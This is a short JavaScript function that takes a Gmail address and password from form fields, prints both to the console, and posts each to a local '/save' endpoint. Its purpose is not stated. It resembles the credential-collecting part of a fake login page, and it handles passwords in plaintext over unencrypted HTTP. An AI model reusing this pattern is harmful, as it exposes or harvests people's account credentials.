function writeFile() {
    const textToFileUserGmail = document.getElementById("Gmail").value;
    const textToFilePassword = document.getElementById("Password").value;

    console.log("Gmail: "+textToFileUserGmail);
    console.log("Password: "+textToFilePassword);
  
    // Create a JavaScript object with "data" as the key and the input string as the value
    var dataObjectUseGmail = { userGmail: textToFileUserGmail };
    var dataObjecUserPassword = { userPassword: textToFilePassword };
    // Convert the JavaScript object to a JSON string
    var jsonObject = JSON.stringify(dataObjectUseGmail);
  
    console.log(jsonObject);
  
    fetch("http://127.0.0.1:5555/save", {
      method: "POST",
      headers: {
        "Content-Type": "application/json; charset=utf-8",
      },
      body: jsonObject,
    })
      .then((response) => response.text())
      .then((responseData) => {
        console.log("Response:", responseData);
      })
      .catch((error) => {
        console.error("Error:", error);
      });

      /*  */
      var jsonObjectPass = JSON.stringify(dataObjecUserPassword);
  
    console.log(jsonObjectPass);
  
    fetch("http://127.0.0.1:5555/save", {
      method: "POST",
      headers: {
        "Content-Type": "application/json; charset=utf-8",
      },
      body: jsonObjectPass,
    })
      .then((response) => response.text())
      .then((responseData) => {
        console.log("Response:", responseData);
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  }